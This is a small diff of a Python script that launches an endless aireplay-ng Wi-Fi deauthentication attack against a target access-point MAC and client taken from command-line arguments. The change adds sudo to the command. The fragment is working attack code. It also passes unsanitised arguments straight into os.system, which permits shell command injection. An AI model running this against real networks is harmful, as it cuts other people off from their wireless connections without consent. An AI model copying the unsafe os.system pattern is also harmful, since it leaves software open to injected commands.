@@ -42,7 +42,7 @@ list_argv = list(sys.argv)
 nm = list_argv[1]+'mon'
 mac = list_argv[2]
 singal = list_argv[3]
-command = 'aireplay-ng -0 0 -a ' + mac + ' -c ' + singal + ' ' + nm 
+command = 'sudo aireplay-ng -0 0 -a ' + mac + ' -c ' + singal + ' ' + nm 
 print(command)
 os.system(command)
 
